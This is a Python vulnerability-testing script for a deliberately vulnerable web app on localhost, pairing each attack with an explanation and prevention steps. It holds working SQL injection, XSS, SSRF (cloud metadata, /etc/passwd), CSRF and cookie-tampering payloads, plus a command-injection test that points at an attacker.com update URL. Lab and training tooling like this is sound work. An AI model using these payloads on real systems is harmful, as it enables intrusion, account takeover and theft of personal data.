#!/usr/bin/env python3
import requests
import json
import sys
import time
from typing import Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin
import html

@dataclass
class TestResult:
    name: str
    success: bool
    details: str
    payload: str
    description: str  # Added field for educational purposes

class VulnerabilityTester:
    def __init__(self, base_url: str = "http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[TestResult] = []

    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("\n=== Starting Vulnerability Testing Suite ===")
        print("This suite demonstrates various web application vulnerabilities.")
        print("Each test includes educational information about the vulnerability.")
        print("⚠️  For educational purposes only! ⚠️\n")

        # Authentication Attacks
        self.test_default_credentials()
        self.test_sql_injection_login()
        self.test_session_fixation()
        self.test_weak_password_policy()
        
        # Injection Attacks
        self.test_sql_injection_search()
        self.test_xss_reflected()
        self.test_xss_stored()
        self.test_command_injection()
        
        # Information Disclosure
        self.test_debug_mode()
        self.test_sensitive_data_exposure()
        self.test_error_disclosure()
        
        # Access Control
        self.test_cookie_manipulation()
        self.test_idor()
        self.test_privilege_escalation()
        
        # Request Forgery
        self.test_csrf()
        self.test_ssrf()
        
        # Cryptographic Issues
        self.test_weak_crypto()
        self.test_plaintext_passwords()
        
        # Infrastructure
        self.test_security_headers()
        self.test_backup_disclosure()
        
        self.print_results()

    def add_result(self, name: str, success: bool, details: str, payload: str, description: str):
        """Add a test result with educational information"""
        self.results.append(TestResult(name, success, details, payload, description))

    def test_cookie_manipulation(self):
        """Test cookie manipulation vulnerabilities"""
        print("\n=== Testing Cookie Manipulation ===")
        description = """
        Vulnerability: Cookie Manipulation / Request Forgery
        Impact: Attackers can modify cookies to impersonate other users
        How it works: The application uses plain text cookies for authentication
        without proper validation or signing.
        
        Prevention:
        1. Use secure session management
        2. Sign cookies with strong cryptographic keys
        3. Implement proper authentication checks
        4. Use secure session tokens instead of plaintext values
        """
        
        try:
            # First login as normal user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Try to access admin profile by modifying cookie
            self.session.cookies.set('current_user', 'admin')
            admin_response = self.session.get(
                urljoin(self.base_url, "/profile/admin")
            )
            
            success = admin_response.status_code == 200 and "admin@company.com" in admin_response.text
            
            details = (
                "Successfully accessed admin profile by modifying cookie"
                if success
                else "Cookie manipulation failed"
            )
            
            self.add_result(
                "Cookie Manipulation",
                success,
                details,
                "Set cookie: current_user=admin",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Cookie Manipulation",
                False,
                f"Error: {str(e)}",
                "Cookie manipulation",
                description
            )

    def test_idor(self):
        """Test Insecure Direct Object References"""
        print("\n=== Testing IDOR ===")
        description = """
        Vulnerability: Insecure Direct Object References (IDOR)
        Impact: Attackers can access resources belonging to other users
        How it works: The application uses predictable IDs or references and
        doesn't properly validate access rights.
        
        Prevention:
        1. Implement proper access controls
        2. Use unpredictable references
        3. Validate user permissions for each request
        4. Use indirect references mapped to real IDs
        """
        
        try:
            # Login as normal user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Try to access another user's data directly
            response = self.session.get(
                urljoin(self.base_url, "/profile/jane.smith")
            )
            
            success = response.status_code == 200 and "jane.smith@email.com" in response.text
            
            details = (
                "Successfully accessed another user's data through IDOR"
                if success
                else "IDOR test failed"
            )
            
            self.add_result(
                "IDOR Vulnerability",
                success,
                details,
                "Direct access to /profile/jane.smith",
                description
            )
            
        except Exception as e:
            self.add_result(
                "IDOR Vulnerability",
                False,
                f"Error: {str(e)}",
                "IDOR test",
                description
            )

    def test_weak_password_policy(self):
        """Test weak password policy"""
        print("\n=== Testing Weak Password Policy ===")
        description = """
        Vulnerability: Weak Password Policy
        Impact: Makes brute force and password guessing attacks easier
        How it works: The application accepts passwords that are:
        - Too short (< 8 characters)
        - Don't require complexity
        - Allow common passwords
        
        Prevention:
        1. Enforce minimum length (at least 8 characters)
        2. Require mixture of character types
        3. Check against common password lists
        4. Implement password strength meters
        """
        
        weak_passwords = [
            "123",  # Too short
            "pass",  # Common password
            "abcd",  # Sequential characters
            "aaaa",  # Repeated characters
        ]
        
        successes = []
        for password in weak_passwords:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/register"),
                    data={
                        "username": f"test_user_{password}",
                        "password": password
                    }
                )
                
                if response.status_code == 302 or "success" in response.text.lower():
                    successes.append(password)
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully registered with weak passwords: {', '.join(successes)}"
            if success
            else "Weak password test failed"
        )
        
        self.add_result(
            "Weak Password Policy",
            success,
            details,
            f"Tested passwords: {', '.join(weak_passwords)}",
            description
        )

    def test_sensitive_data_exposure(self):
        """Test sensitive data exposure in responses"""
        print("\n=== Testing Sensitive Data Exposure ===")
        description = """
        Vulnerability: Sensitive Data Exposure
        Impact: Attackers can access sensitive user information
        How it works: The application exposes sensitive data in:
        - API responses
        - Error messages
        - Debug output
        - Backup files
        
        Prevention:
        1. Minimize sensitive data exposure
        2. Implement proper data classification
        3. Encrypt sensitive data
        4. Use proper error handling
        """
        
        sensitive_patterns = [
            "password",
            "credit_card",
            "ssn",
            "address",
            "phone",
            "date_of_birth"
        ]
        
        try:
            # Login and access profile
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            response = self.session.get(
                urljoin(self.base_url, "/profile/admin")
            )
            
            # Check for sensitive data in response
            response_data = response.json()
            exposed_fields = [
                pattern for pattern in sensitive_patterns
                if pattern in str(response_data).lower()
            ]
            
            success = len(exposed_fields) > 0
            details = (
                f"Found exposed sensitive data: {', '.join(exposed_fields)}"
                if success
                else "No sensitive data found in response"
            )
            
            self.add_result(
                "Sensitive Data Exposure",
                success,
                details,
                "GET /profile/admin",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Sensitive Data Exposure",
                False,
                f"Error: {str(e)}",
                "Sensitive data test",
                description
            )

    def test_security_headers(self):
        """Test for missing or misconfigured security headers"""
        print("\n=== Testing Security Headers ===")
        description = """
        Vulnerability: Missing/Misconfigured Security Headers
        Impact: Makes the application vulnerable to various attacks
        How it works: The application is missing important security headers or
        has them configured insecurely.
        
        Prevention:
        1. Implement all important security headers
        2. Use secure values for headers
        3. Regular security header audits
        4. Use security header scanning tools
        """
        
        security_headers = {
            'X-Frame-Options': lambda v: 'DENY' in v or 'SAMEORIGIN' in v,
            'X-Content-Type-Options': lambda v: 'nosniff' in v.lower(),
            'Content-Security-Policy': lambda v: "'unsafe-inline'" not in v and "'unsafe-eval'" not in v,
            'Strict-Transport-Security': lambda v: 'max-age=' in v.lower(),
            'X-XSS-Protection': lambda v: '1' in v,
        }
        
        try:
            response = self.session.get(self.base_url)
            
            # Check for missing or insecure headers
            missing_headers = []
            insecure_headers = []
            
            for header, validator in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(header)
                elif not validator(response.headers[header]):
                    insecure_headers.append(header)
            
            success = len(missing_headers) > 0 or len(insecure_headers) > 0
            details = []
            
            if missing_headers:
                details.append(f"Missing headers: {', '.join(missing_headers)}")
            if insecure_headers:
                details.append(f"Insecure headers: {', '.join(insecure_headers)}")
            
            self.add_result(
                "Security Headers",
                success,
                " | ".join(details),
                "GET /",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Security Headers",
                False,
                f"Error: {str(e)}",
                "Security headers test",
                description
            )

    def test_ssrf(self):
        """Test Server-Side Request Forgery"""
        print("\n=== Testing SSRF ===")
        description = """
        Vulnerability: Server-Side Request Forgery (SSRF)
        Impact: Attackers can make the server request internal resources
        How it works: The application makes HTTP requests to user-supplied URLs
        without proper validation.
        
        Prevention:
        1. Validate and sanitize URL input
        2. Use allowlists for domains
        3. Block requests to internal networks
        4. Disable unnecessary URL schemes
        """
        
        ssrf_targets = [
            {
                "url": "http://localhost:22",
                "description": "Internal SSH port scan"
            },
            {
                "url": "http://169.254.169.254/latest/meta-data",
                "description": "AWS metadata service"
            },
            {
                "url": "file:///etc/passwd",
                "description": "Local file access"
            }
        ]
        
        successes = []
        for target in ssrf_targets:
            try:
                # Try both SSRF endpoints
                avatar_response = self.session.get(
                    urljoin(self.base_url, f"/fetch-avatar?url={target['url']}")
                )
                check_response = self.session.get(
                    urljoin(self.base_url, f"/check-website?url={target['url']}")
                )
                
                if avatar_response.status_code != 404 or check_response.status_code != 404:
                    successes.append(target['description'])
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully performed SSRF: {', '.join(successes)}"
            if success
            else "SSRF tests failed"
        )
        
        self.add_result(
            "SSRF Vulnerability",
            success,
            details,
            str(ssrf_targets),
            description
        )

    def test_command_injection(self):
        """Test command injection in update mechanism"""
        print("\n=== Testing Command Injection ===")
        description = """
        Vulnerability: Command Injection
        Impact: Attackers can execute arbitrary commands on the server
        How it works: The application executes system commands with user input
        without proper sanitization.
        
        Prevention:
        1. Avoid command execution with user input
        2. Use parameterized APIs instead of shell commands
        3. Implement strict input validation
        4. Run with minimal privileges
        """
        
        try:
            # Try command injection through update mechanism
            payload = {
                "version": "2.0",
                "commands": [
                    "echo 'test' > /tmp/test_ci",
                    "id",
                    "whoami"
                ]
            }
            
            # Host the malicious update JSON
            update_data = {
                "update_url": "http://attacker.com/malicious-update.json"
            }
            
            response = self.session.post(
                urljoin(self.base_url, "/apply-update"),
                data=update_data
            )
            
            success = response.status_code == 200
            details = (
                "Update mechanism vulnerable to command injection"
                if success
                else "Command injection test failed"
            )
            
            self.add_result(
                "Command Injection",
                success,
                details,
                json.dumps(payload, indent=2),
                description
            )
            
        except Exception as e:
            self.add_result(
                "Command Injection",
                False,
                f"Error: {str(e)}",
                "Command injection test",
                description
            )

    def test_error_disclosure(self):
        """Test error message disclosure"""
        print("\n=== Testing Error Disclosure ===")
        description = """
        Vulnerability: Detailed Error Disclosure
        Impact: Attackers can gather information about the application
        How it works: The application returns detailed error messages that
        reveal implementation details, stack traces, or sensitive information.
        
        Prevention:
        1. Use generic error messages in production
        2. Log detailed errors server-side only
        3. Implement proper error handling
        4. Never expose stack traces to users
        """
        
        error_tests = [
            {
                "path": "/debug-test",
                "expected": ["traceback", "error"]
            },
            {
                "path": "/nonexistent",
                "expected": ["stack", "trace", "error"]
            },
            {
                "path": "/search?q='",
                "expected": ["sql", "syntax", "error"]
            }
        ]
        
        successes = []
        for test in error_tests:
            try:
                response = self.session.get(
                    urljoin(self.base_url, test["path"])
                )
                
                response_text = response.text.lower()
                if any(exp in response_text for exp in test["expected"]):
                    successes.append(test["path"])
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Found detailed error messages in: {', '.join(successes)}"
            if success
            else "No detailed error messages found"
        )
        
        self.add_result(
            "Error Disclosure",
            success,
            details,
            str(error_tests),
            description
        )

    def test_backup_disclosure(self):
        """Test backup file disclosure"""
        print("\n=== Testing Backup Disclosure ===")
        description = """
        Vulnerability: Backup File Disclosure
        Impact: Attackers can access sensitive backup data
        How it works: The application exposes backup functionality without
        proper access controls or data protection.
        
        Prevention:
        1. Implement proper access controls
        2. Encrypt backup data
        3. Use secure backup mechanisms
        4. Never expose backup endpoints publicly
        """
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/backup")
            )
            
            success = response.status_code == 200
            sensitive_data_exposed = False
            
            if success:
                data = response.json()
                sensitive_data_exposed = (
                    "admin_password" in data or
                    "users" in data
                )
            
            details = (
                "Successfully accessed backup data with sensitive information"
                if sensitive_data_exposed
                else "Backup endpoint accessible but no sensitive data found"
                if success
                else "Backup disclosure test failed"
            )
            
            self.add_result(
                "Backup Disclosure",
                sensitive_data_exposed,
                details,
                "POST /backup",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Backup Disclosure",
                False,
                f"Error: {str(e)}",
                "Backup disclosure test",
                description
            )

    def test_default_credentials(self):
        """Test default credentials"""
        print("\n=== Testing Default Credentials ===")
        description = """
        Vulnerability: Default/Hardcoded Credentials
        Impact: Attackers can gain unauthorized access using known default credentials
        How it works: The application ships with default admin credentials that
        are either not changed or cannot be changed.
        
        Prevention:
        1. Force password change on first login
        2. No hardcoded credentials in code
        3. Generate random admin password during installation
        4. Implement strong password policies
        """
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                }
            )
            
            success = "dashboard" in response.text.lower()
            details = (
                "Successfully logged in with default admin credentials"
                if success
                else "Default credentials test failed"
            )
            
            self.add_result(
                "Default Credentials",
                success,
                details,
                "admin:admin123",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Default Credentials",
                False,
                f"Error: {str(e)}",
                "admin:admin123",
                description
            )

    def test_sql_injection_login(self):
        """Test SQL injection in login form"""
        print("\n=== Testing SQL Injection (Login) ===")
        description = """
        Vulnerability: SQL Injection in Login Form
        Impact: Attackers can bypass authentication or extract data
        How it works: User input is directly concatenated into SQL queries
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        payloads = [
            {
                "name": "Basic login bypass",
                "username": "admin' OR '1'='1",
                "password": "anything",
                "expected": "dashboard"
            },
            {
                "name": "Comment out password check",
                "username": "admin'--",
                "password": "anything",
                "expected": "dashboard"
            },
            {
                "name": "UNION-based injection",
                "username": "' UNION SELECT 'admin','admin123',1,1,1,1,1,1,1,1--",
                "password": "anything",
                "expected": "dashboard"
            }
        ]
        
        successes = []
        for payload in payloads:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={
                        "username": payload["username"],
                        "password": payload["password"]
                    }
                )
                
                if payload["expected"] in response.text.lower():
                    successes.append(payload["name"])
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully exploited SQL injection: {', '.join(successes)}"
            if success
            else "SQL injection tests failed"
        )
        
        self.add_result(
            "SQL Injection (Login)",
            success,
            details,
            str(payloads),
            description
        )

    def test_session_fixation(self):
        """Test session fixation vulnerability"""
        print("\n=== Testing Session Fixation ===")
        description = """
        Vulnerability: Session Fixation
        Impact: Attackers can hijack user sessions
        How it works: The application doesn't regenerate session IDs upon
        authentication, allowing attackers to set a known session ID.
        
        Prevention:
        1. Regenerate session ID on login
        2. Invalidate old sessions
        3. Use secure session management
        4. Implement proper session timeouts
        """
        
        try:
            # First request to get a session
            self.session.get(urljoin(self.base_url, "/fixation-login"))
            original_session = self.session.cookies.get('session')
            
            # Login with the same session
            response = self.session.post(
                urljoin(self.base_url, "/fixation-login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                }
            )
            
            new_session = self.session.cookies.get('session')
            success = original_session == new_session
            
            details = (
                "Session ID not regenerated after login (vulnerable)"
                if success
                else "Session fixation test failed"
            )
            
            self.add_result(
                "Session Fixation",
                success,
                details,
                f"Original Session: {original_session}, New Session: {new_session}",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Session Fixation",
                False,
                f"Error: {str(e)}",
                "Session fixation test",
                description
            )

    def test_xss_stored(self):
        """Test stored XSS vulnerability"""
        print("\n=== Testing Stored XSS ===")
        description = """
        Vulnerability: Stored Cross-Site Scripting (XSS)
        Impact: Attackers can store and execute malicious scripts that affect other users
        How it works: User input containing JavaScript is stored in the database
        and rendered without proper escaping.
        
        Prevention:
        1. Input validation and sanitization
        2. Output encoding
        3. Content Security Policy (CSP)
        4. HTTPOnly cookies
        """
        
        xss_payloads = [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert(1)"
        ]
        
        successes = []
        for payload in xss_payloads:
            try:
                # Try to register a user with XSS in username
                response = self.session.post(
                    urljoin(self.base_url, "/register"),
                    data={
                        "username": payload,
                        "password": "test123"
                    }
                )
                
                # Check if the payload is stored and reflected
                if payload in response.text:
                    successes.append(payload)
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully stored XSS payloads: {', '.join(successes)}"
            if success
            else "Stored XSS test failed"
        )
        
        self.add_result(
            "Stored XSS",
            success,
            details,
            str(xss_payloads),
            description
        )

    def test_privilege_escalation(self):
        """Test privilege escalation through cookie manipulation"""
        print("\n=== Testing Privilege Escalation ===")
        description = """
        Vulnerability: Privilege Escalation
        Impact: Regular users can gain admin privileges
        How it works: The application uses client-side cookies to store
        privilege information without proper validation.
        
        Prevention:
        1. Server-side session management
        2. Proper access control checks
        3. Don't trust client-side data
        4. Implement role-based access control
        """
        
        try:
            # Login as normal user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "john.doe",
                    "password": "password123"
                }
            )
            
            # Try to escalate privileges by modifying cookie
            self.session.cookies.set('is_admin', 'true')
            
            # Try to access admin functionality
            response = self.session.get(
                urljoin(self.base_url, "/admin/delete-user/test")
            )
            
            success = response.status_code == 200 and "success" in response.text.lower()
            
            details = (
                "Successfully escalated privileges through cookie manipulation"
                if success
                else "Privilege escalation test failed"
            )
            
            self.add_result(
                "Privilege Escalation",
                success,
                details,
                "Set cookie: is_admin=true",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Privilege Escalation",
                False,
                f"Error: {str(e)}",
                "Privilege escalation test",
                description
            )

    def test_weak_crypto(self):
        """Test weak cryptographic implementation"""
        print("\n=== Testing Weak Cryptography ===")
        description = """
        Vulnerability: Weak Cryptographic Implementation
        Impact: Sensitive data can be easily decrypted or cracked
        How it works: The application uses weak cryptographic algorithms
        (like MD5) or implements cryptography incorrectly.
        
        Prevention:
        1. Use strong, modern cryptographic algorithms
        2. Proper key management
        3. Use established cryptographic libraries
        4. Regular security audits
        """
        
        try:
            # Test MD5 hashing endpoint
            test_data = "sensitive_data"
            response = self.session.post(
                urljoin(self.base_url, "/hash"),
                data={"data": test_data}
            )
            
            if response.status_code == 200:
                result = response.json()
                # Check if it's using MD5 (32 characters hex)
                success = len(result.get("hashed_data", "")) == 32
                
                details = (
                    "Application uses weak MD5 hashing"
                    if success
                    else "Weak crypto test failed"
                )
            else:
                success = False
                details = "Could not test crypto implementation"
            
            self.add_result(
                "Weak Cryptography",
                success,
                details,
                f"Data: {test_data}",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Weak Cryptography",
                False,
                f"Error: {str(e)}",
                "Crypto test",
                description
            )

    def test_plaintext_passwords(self):
        """Test for plaintext password storage"""
        print("\n=== Testing Plaintext Password Storage ===")
        description = """
        Vulnerability: Plaintext Password Storage
        Impact: Password database compromise exposes all user passwords
        How it works: The application stores passwords in plaintext or using
        reversible encryption instead of proper hashing.
        
        Prevention:
        1. Use strong password hashing (bcrypt, Argon2)
        2. Implement proper salting
        3. Never store plaintext passwords
        4. Use secure password reset instead of recovery
        """
        
        try:
            # Try to extract passwords through SQL injection
            response = self.session.get(
                urljoin(self.base_url, "/search"),
                params={"q": "' UNION SELECT username,password,id,email,full_name,address,phone,credit_card,ssn,date_of_birth FROM user--"}
            )
            
            if response.status_code == 200:
                data = response.json()
                # Check if we can see known test passwords
                success = any(
                    user.get("password") in ["admin123", "password123", "letmein123"]
                    for user in data
                )
                
                details = (
                    "Successfully extracted plaintext passwords"
                    if success
                    else "Plaintext password test failed"
                )
            else:
                success = False
                details = "Could not test password storage"
            
            self.add_result(
                "Plaintext Passwords",
                success,
                details,
                "SQL injection to extract passwords",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Plaintext Passwords",
                False,
                f"Error: {str(e)}",
                "Password storage test",
                description
            )

    def test_xss_reflected(self):
        """Test reflected XSS vulnerabilities"""
        print("\n=== Testing Reflected XSS ===")
        description = """
        Vulnerability: Reflected Cross-Site Scripting (XSS)
        Impact: Attackers can execute malicious scripts in users' browsers
        How it works: User input is reflected back in the response without
        proper escaping or sanitization.
        
        Prevention:
        1. Input validation and sanitization
        2. Output encoding
        3. Content Security Policy (CSP)
        4. X-XSS-Protection header
        """
        
        xss_payloads = [
            {
                "payload": "<script>alert(document.cookie)</script>",
                "expected": "<script>alert"
            },
            {
                "payload": "<img src=x onerror=alert(1)>",
                "expected": "onerror=alert"
            },
            {
                "payload": "<svg/onload=alert('XSS')>",
                "expected": "<svg/onload=alert"
            }
        ]
        
        successes = []
        for test in xss_payloads:
            try:
                # Test search endpoint
                response = self.session.get(
                    urljoin(self.base_url, "/search"),
                    params={"q": test["payload"]}
                )
                
                if test["expected"] in response.text:
                    successes.append(test["payload"])
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully reflected XSS payloads: {', '.join(successes)}"
            if success
            else "Reflected XSS test failed"
        )
        
        self.add_result(
            "Reflected XSS",
            success,
            details,
            str(xss_payloads),
            description
        )

    def test_csrf(self):
        """Test CSRF vulnerabilities"""
        print("\n=== Testing CSRF ===")
        description = """
        Vulnerability: Cross-Site Request Forgery (CSRF)
        Impact: Attackers can perform actions on behalf of authenticated users
        How it works: The application accepts state-changing requests without
        verifying they originated from a legitimate source.
        
        Prevention:
        1. Implement CSRF tokens
        2. SameSite cookie attribute
        3. Custom request headers
        4. Verify Origin/Referer headers
        """
        
        try:
            # First login to get a valid session
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                }
            )
            
            # Try to perform action with different origin
            headers = {
                "Origin": "http://evil-site.com",
                "Referer": "http://evil-site.com/csrf.html"
            }
            
            # Test password change without CSRF token
            response = self.session.post(
                urljoin(self.base_url, "/admin/reset-password"),
                data={
                    "username": "john.doe",
                    "password": "hacked"
                },
                headers=headers
            )
            
            success = response.status_code == 200 and "success" in response.text.lower()
            
            details = (
                "Successfully performed CSRF attack (no CSRF protection)"
                if success
                else "CSRF test failed"
            )
            
            self.add_result(
                "CSRF Vulnerability",
                success,
                details,
                "POST request with different origin",
                description
            )
            
        except Exception as e:
            self.add_result(
                "CSRF Vulnerability",
                False,
                f"Error: {str(e)}",
                "CSRF test",
                description
            )

    def test_sql_injection_search(self):
        """Test SQL injection in search functionality"""
        print("\n=== Testing SQL Injection (Search) ===")
        description = """
        Vulnerability: SQL Injection in Search Function
        Impact: Attackers can extract sensitive data or manipulate database
        How it works: Search query is directly concatenated into SQL query
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        sql_payloads = [
            {
                "payload": "' OR '1'='1",
                "expected": "admin"
            },
            {
                "payload": "' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--",
                "expected": "user"
            },
            {
                "payload": "' UNION SELECT password,username,id FROM user--",
                "expected": "admin123"
            }
        ]
        
        successes = []
        for test in sql_payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/search"),
                    params={"q": test["payload"]}
                )
                
                if response.status_code == 200:
                    response_text = str(response.text).lower()
                    if test["expected"] in response_text:
                        successes.append(test["payload"])
                
            except Exception:
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully exploited SQL injection: {', '.join(successes)}"
            if success
            else "SQL injection tests failed"
        )
        
        self.add_result(
            "SQL Injection (Search)",
            success,
            details,
            str(sql_payloads),
            description
        )

    def test_debug_mode(self):
        """Test debug mode vulnerabilities"""
        print("\n=== Testing Debug Mode ===")
        description = """
        Vulnerability: Debug Mode Enabled
        Impact: Attackers can access sensitive debug information and potentially
        execute arbitrary code through the debug console.
        How it works: The application runs with debug mode enabled in production,
        exposing detailed error messages and debug features.
        
        Prevention:
        1. Disable debug mode in production
        2. Use proper error handling
        3. Implement logging instead of debug output
        4. Use environment-specific configurations
        """
        
        try:
            # Test debug endpoint
            response = self.session.get(
                urljoin(self.base_url, "/debug-test")
            )
            
            # Check for common debug indicators
            debug_indicators = [
                "traceback",
                "debug",
                "stack trace",
                "line number",
                "file ",
                "module"
            ]
            
            response_text = response.text.lower()
            found_indicators = [
                indicator for indicator in debug_indicators
                if indicator in response_text
            ]
            
            success = len(found_indicators) > 0
            details = (
                f"Debug mode enabled, found indicators: {', '.join(found_indicators)}"
                if success
                else "Debug mode test failed"
            )
            
            self.add_result(
                "Debug Mode",
                success,
                details,
                "GET /debug-test",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Debug Mode",
                False,
                f"Error: {str(e)}",
                "Debug mode test",
                description
            )

    def print_results(self):
        """Print test results in a formatted way"""
        print("\n=== VULNERABILITY TEST RESULTS ===\n")
        
        total_tests = len(self.results)
        successful_tests = sum(1 for r in self.results if r.success)
        
        print(f"Total Tests: {total_tests}")
        print(f"Vulnerabilities Found: {successful_tests}")
        print(f"Failed Tests: {total_tests - successful_tests}")
        print("\nDetailed Results:")
        print("=" * 100)
        
        for result in self.results:
            print(f"\nTest: {result.name}")
            print(f"Status: {'✅ VULNERABLE' if result.success else '❌ NOT VULNERABLE'}")
            print("\nDescription:")
            print(result.description)
            print("\nDetails:", result.details)
            print("\nPayload:", result.payload)
            print("-" * 100)

def main():
    print("""
    🚨 Vulnerability Testing Suite 🚨
    ===============================
    
    This tool demonstrates various web application vulnerabilities for educational purposes.
    Each test includes:
    - Vulnerability description
    - How it works
    - Impact
    - Prevention measures
    
    ⚠️  WARNING: Use only in controlled environments! ⚠️
    """)
    
    try:
        tester = VulnerabilityTester()
        tester.run_all_tests()
        
    except requests.exceptions.ConnectionError:
        print("\nERROR: Cannot connect to the application.")
        print("Make sure it's running at http://localhost:5001")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nTesting interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 